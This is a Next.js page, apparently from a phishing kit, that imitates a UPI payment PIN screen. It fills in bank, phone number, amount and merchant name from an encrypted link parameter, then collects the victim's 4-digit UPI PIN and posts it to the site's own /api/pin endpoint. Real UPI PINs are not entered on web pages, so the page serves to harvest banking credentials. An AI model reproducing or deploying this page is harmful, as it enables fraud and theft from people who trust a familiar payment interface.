import Head from 'next/head'
import { useEffect, useState } from 'react'
import { _decodePaymentUrl } from '../lib/generateUrl'
import { cryptPin, _csrfTokenCreate, _csrfTokenDecode } from '../lib/hashing'
import { _validatePin } from '../lib/validator'

export async function getServerSideProps({req, query}) {
  let encryption = query.encryption
  let encryptionData = await _decodePaymentUrl(encryption)
  let token = _csrfTokenCreate(req)
  encryptionData = {...encryptionData, token, encryption}
  return {
    props: encryptionData
  }
}

const allPins = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]

const Home =({token, mobile, amount, bank, merchant_name, encryption}) => {

  const [isHide, setIsHide] = useState(false)
  const [codes, setCodes] = useState([])

  useEffect(() => { 
    const text = document.getElementById("recipient")
    const limit = 13
    const truncated = text.innerText.substring(0, limit) + "..."
    text.innerText = truncated
  }, [])

  const _addBorder = (length) => {
    for (let i = 1; i <= 4; i++) {
      const borders = document.getElementById(`border${i}`)
      if (length === i) {
        borders.style.backgroundColor = "gray"
      } else {
        borders.style.backgroundColor = "lightgray"
      }
    }
  }

  const _pinClick = key => {
    let length = codes.length
    if (length == 4) {
      return
    }

    let pins = [...codes, ...[key]]
    length = pins.length
    _addBorder(length)
    setCodes(pins)
  }

  const _deleteInput = () => {
    let pins = [...codes]
    pins.pop()
    setCodes(pins)

    let length = pins.length
    _addBorder(length)
  }

  const _submit = () => {
    let pinstr = codes.toLocaleString()
    let pin = cryptPin(pinstr)
    document.getElementById("pin").value = pin
    _validatePin(codes)
  }

  return (
    <>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <div className="top">
        <p>{bank}</p>
        <p>{mobile}</p>
      </div>

      <div className="header">
        <p>Sending &#8377; {amount}</p>
        <div>
          <p id="recipient">To: {merchant_name}</p>
          <i className="fa-solid fa-chevron-down"></i>
        </div>
      </div>

      <div className="body">
        <p>ENTER 4-DIGIT UPI PIN</p>
        <div className="input-number">
          <div id="input">
            {
              codes.map((code, index) => {
                return <p className="code" key={index}>{isHide ? "â€¢" : code}</p>
              })
            }
          </div>
        </div>
        <div className="input-border">
          <div id="border1"></div>
          <div id="border2"></div>
          <div id="border3"></div>
          <div id="border4"></div>
        </div>
        <div className="toggleText">
          <i className="fa-solid fa-eye"></i>
          <p onClick={() => setIsHide(!isHide)} id="toggleText">{isHide ? "SHOW" : "HIDE"}</p>
        </div>
        <p>
          <i className="fa-solid fa-circle-info"></i> You are transferring money from
          your account to {merchant_name}
        </p>
      </div>

      <div className="keypad">
        {
          allPins.map((pins, index) => {
            return (
              <div key={index}>
                {
                  pins.map((pin, pindex) => {
                    return <button key={pindex} onClick={() => _pinClick(pin)}>{pin}</button>
                  }) 
                }
              </div>
            )
          })
        }
        <div>
          <i className="fa-solid fa-delete-left" onClick={() => _deleteInput()}></i>
          <button onClick={() => _pinClick(0)}>0</button>
          <i className="fa-solid fa-circle-check" onClick={() => _submit()}></i>
        </div>
      </div>

      <form action='/api/pin' method='post' id='form'>
        <input type={"hidden"} name="_csrf" value={token} />
        <input type={"hidden"} name="encryption" value={encryption} />
        <input type={"hidden"} name="pin" id='pin' value={""} />
      </form>

    </>
  )
}


export default Home